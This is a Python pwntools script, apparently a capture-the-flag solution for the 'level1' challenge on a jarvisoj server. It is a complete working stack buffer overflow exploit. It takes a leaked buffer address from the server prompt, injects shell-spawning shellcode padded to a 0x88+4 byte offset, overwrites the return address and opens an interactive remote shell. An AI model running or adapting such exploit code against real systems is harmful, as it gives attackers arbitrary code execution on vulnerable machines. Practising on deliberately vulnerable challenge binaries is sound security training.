#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

context(arch='i386', os='linux')

ELF_IMG = './level1'
BSS = 0x0804A028

shellcode = asm(shellcraft.sh())

# io = process('./level1')
io = remote('pwn2.jarvisoj.com', 9877)

msg = io.recvuntil('?\n')
bufaddr = int(msg[14 : 22], 16)

offset = 0x88

payload = shellcode + 'a' * (offset + 4 - len(shellcode)) + p32(bufaddr)

io.sendline(payload)

# io.recv()

io.interactive()
